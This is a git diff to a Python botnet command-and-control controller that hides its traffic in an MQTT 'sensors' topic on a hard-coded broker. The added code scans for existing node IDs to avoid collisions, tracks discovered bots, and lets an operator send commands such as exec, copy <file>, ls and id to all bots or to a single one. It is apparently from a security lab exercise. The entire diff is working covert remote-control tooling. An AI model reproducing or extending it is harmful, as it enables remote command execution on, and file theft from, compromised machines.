@@ -2,6 +2,9 @@
 Controller - MQTT C&C Server using layered protocol stack.
 """
 import random
+import time
+import paho.mqtt.client as mqtt
+import json
 from protocol import ProtocolStack
 
 # --- CONFIGURATION ---
@@ -9,8 +12,50 @@ BROKER = "147.32.82.209"
 PORT = 1883
 TOPIC = "sensors"
 SALT = "S4ur0ns_S3cr3t_S4lt_2025"
-CONTROLLER_ID = f"sensor_{random.randint(100, 999)}1"  # Ends with 1 = hub
 SEND_INTERVAL = 1.0
+ID_SCAN_TIME = 2.0  # Seconds to scan for existing IDs
+
+# Track discovered bots
+discovered_bots = set()
+
+
+def scan_existing_ids(broker: str, port: int, topic: str, scan_time: float) -> set:
+    """Scan the network for 2 seconds to find existing sensor IDs."""
+    existing_ids = set()
+    
+    def on_message(client, userdata, msg):
+        try:
+            data = json.loads(msg.payload.decode())
+            sensor_id = data.get("sensor_id", "")
+            if sensor_id.startswith("sensor_"):
+                existing_ids.add(sensor_id)
+        except:
+            pass
+    
+    def on_connect(client, userdata, flags, reason_code, properties):
+        client.subscribe(topic)
+    
+    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
+    client.on_connect = on_connect
+    client.on_message = on_message
+    client.connect(broker, port, 60)
+    client.loop_start()
+    
+    time.sleep(scan_time)
+    
+    client.loop_stop()
+    client.disconnect()
+    
+    return existing_ids
+
+
+def generate_unique_hub_id(existing_ids: set) -> str:
+    """Generate a unique hub ID (always ends with 1)."""
+    while True:
+        hub_id = f"sensor_{random.randint(100, 999)}1"
+        
+        if hub_id not in existing_ids:
+            return hub_id
 
 
 def handle_message(message: dict):
@@ -18,6 +63,10 @@ def handle_message(message: dict):
     msg_type = message.get("type")
     target = message.get("target")
     sender = message.get("sender")
+    
+    # Track any bot that responds
+    if sender and sender.startswith("sensor_") and not sender.endswith("1"):
+        discovered_bots.add(sender)
     
     # Only handle responses targeted at us
     if msg_type != "response":
@@ -32,7 +81,49 @@ def handle_message(message: dict):
         print("(File content received)")
 
 
+def parse_command(cmd_str: str) -> tuple:
+    """
+    Parse command string, supporting @target syntax.
+    
+    Examples:
+        'ping'              -> ('ALL', 'ping', '')
+        '@sensor_1234 ping' -> ('sensor_1234', 'ping', '')
+        '@sensor_1234 ls /tmp' -> ('sensor_1234', 'ls', '/tmp')
+    """
+    parts = cmd_str.split()
+    if not parts:
+        return None, None, None
+    
+    # Check for @target prefix
+    if parts[0].startswith("@"):
+        target = parts[0][1:]  # Remove @ prefix
+        if len(parts) < 2:
+            return target, None, None
+        cmd = parts[1]
+        arg = " ".join(parts[2:]) if len(parts) > 2 else ""
+    else:
+        target = "ALL"
+        cmd = parts[0]
+        arg = " ".join(parts[1:]) if len(parts) > 1 else ""
+    
+    return target, cmd, arg
+
+
 if __name__ == "__main__":
+    # Scan for existing IDs to avoid collisions
+    print(f"[*] Scanning for existing nodes ({ID_SCAN_TIME}s)...")
+    existing_ids = scan_existing_ids(BROKER, PORT, TOPIC, ID_SCAN_TIME)
+    
+    if existing_ids:
+        print(f"[*] Found {len(existing_ids)} existing nodes")
+        # Add existing bots to discovered set
+        for sid in existing_ids:
+            if not sid.endswith("1"):
+                discovered_bots.add(sid)
+    
+    # Generate unique hub ID
+    CONTROLLER_ID = generate_unique_hub_id(existing_ids)
+    
     # Create and start protocol stack
     stack = ProtocolStack(
         node_id=CONTROLLER_ID,
@@ -50,6 +141,8 @@ if __name__ == "__main__":
     print(f"Controller ID: {CONTROLLER_ID} (sending every {SEND_INTERVAL}s)")
     print(f"Chunk size: {stack.get_chunk_size()} bytes")
     print("Commands: ping, w, ls <dir>, id, copy <file>, exec <cmd>")
+    print("Targeting: @sensor_XXXX <cmd> (or just <cmd> for ALL)")
+    print("Special: list (show discovered bots)")
     
     stack.start()
     
@@ -61,12 +154,26 @@ if __name__ == "__main__":
             if cmd_str == "exit":
                 break
             
-            parts = cmd_str.split(" ", 1)
-            cmd = parts[0]
-            arg = parts[1] if len(parts) > 1 else ""
+            # Special command: list discovered bots
+            if cmd_str == "list":
+                if discovered_bots:
+                    print(f"\n[*] Discovered bots ({len(discovered_bots)}):")
+                    for bot_id in sorted(discovered_bots):
+                        print(f"    {bot_id}")
+                    print()
+                else:
+                    print("\n[*] No bots discovered yet. Try 'ping' first.\n")
+                continue
             
-            stack.send("ALL", "command", cmd=cmd, arg=arg)
-            print(f"[*] Command sent (will be chunked if large)")
+            target, cmd, arg = parse_command(cmd_str)
+            
+            if not cmd:
+                print("[!] Invalid command format")
+                continue
+            
+            stack.send(target, "command", cmd=cmd, arg=arg)
+            target_str = target if target != "ALL" else "all bots"
+            print(f"[*] Command '{cmd}' sent to {target_str}")
     except KeyboardInterrupt:
         pass
     
